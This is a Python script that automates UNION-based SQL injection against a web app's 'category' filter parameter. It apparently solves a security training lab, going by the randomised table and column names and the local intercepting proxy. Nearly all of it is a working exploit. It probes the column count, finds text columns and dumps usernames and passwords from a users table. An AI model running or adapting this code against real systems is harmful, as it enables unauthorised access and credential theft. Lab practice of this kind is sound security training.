# DUMP all usernames and passwords from non-oracle dbs

import requests
import sys
import urllib3

from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': '127.0.0.1:8080', 'https': '127.0.0.1:8080'}

credentials = ""

def exploit_sqli(url, payload):
    uri = '/filter?category='

    for i in range(1, 20):
        r = requests.get(url + uri + payload + "' ORDER BY " + str(i) + "--", verify=False, proxies=proxies)

        if "Error" in r.text:
            break

    null_col_list = list()

    num_columns = i - 1

    for x in range(0, num_columns):
        null_col_list.append('NULL')

    text_col_indices = list()

    for x in range(0, num_columns):
        null_col_list[x] = "'text'"

        union_query = "' union select " + ", ".join(f"{item}" for item in null_col_list)
        r = requests.get(url + uri + payload + union_query + "--", verify=False, proxies=proxies)

        if 'Error' not in r.text:
            text_col_indices.append(x)
        
        null_col_list[x] = 'NULL'

    null_col_list[text_col_indices[0]] = "username_sgewfz"
    null_col_list[text_col_indices[1]] = "password_redwxo"

    union_query = "' union select " + ", ".join(f"{item}" for item in null_col_list) + " from users_mhrvwl"

    r = requests.get(url + uri + payload + union_query + "--", verify=False, proxies=proxies)

    if 'Error' not in r.text:
        soup = BeautifulSoup(r.text, "html.parser")

        tbody = soup.find("tbody")

        if tbody:
            global credentials
            credentials = tbody.get_text(separator="\n", strip=True)
        else:
            print("No tbody found!")
        return True
    
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print("[-] Usage: %s <url>"% sys.argv[0])
        print('[-] Example: %s www.example.com'% sys.argv[0])
        sys.exit(-1)

    num_columns = exploit_sqli(url, payload= '')
    if num_columns:
       print("[+] SQL Injection successful, the credentials are:")
       print(credentials)
    else:
       print("[-] SQL Injection unsuccessful")